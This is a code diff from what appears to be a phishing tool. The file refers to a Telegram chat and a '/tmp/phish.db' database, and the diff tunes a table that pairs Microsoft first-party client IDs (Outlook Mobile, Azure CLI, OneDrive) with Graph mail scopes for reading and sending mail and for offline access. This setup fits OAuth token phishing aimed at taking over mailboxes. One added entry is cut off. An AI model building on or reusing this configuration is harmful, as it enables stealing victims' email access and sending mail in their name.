@@ -14,26 +14,23 @@ TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
 CLIENT_SCOPES = {
-    "d3590ed6-52b3-4102-aeff-aad2292ab01c":
-        "https://graph.microsoft.com/MailboxSettings.ReadWrite "
-        "https://graph.microsoft.com/Mail.ReadWrite "
-        "https://graph.microsoft.com/Mail.Send "
-        "https://graph.microsoft.com/User.Read offline_access",
-
+    # Outlook Mobile — most reliable, Graph preauthorized
     "27922004-5251-4030-b22d-91ecd9a37ea4":
         "https://graph.microsoft.com/Mail.Read "
         "https://graph.microsoft.com/Mail.Send "
-        "https://graph.microsoft.com/User.Read offline_access",
+        "https://graph.microsoft.com/User.Read "
+        "offline_access",
 
-    "1950a258-227b-4e31-a9cf-717495945fc2":
-        "https://graph.microsoft.com/Mail.ReadWrite "
-        "https://graph.microsoft.com/Mail.Send "
-        "https://graph.microsoft.com/User.Read offline_access",
-
+    # Azure CLI
     "04b07795-8ddb-461a-bbee-02f9e1bf7b46":
         "https://graph.microsoft.com/Mail.ReadWrite "
         "https://graph.microsoft.com/Mail.Send "
-        "https://graph.microsoft.com/User.Read offline_access",
+        "https://graph.microsoft.com/User.Read "
+        "offline_access",
+
+    # OneDrive Sync Client
+    "b26aadf8-566f-4478-926f-589f601d9c74":
+   ...
 }
 
 CLIENT_IDS = list(CLIENT_SCOPES.keys())
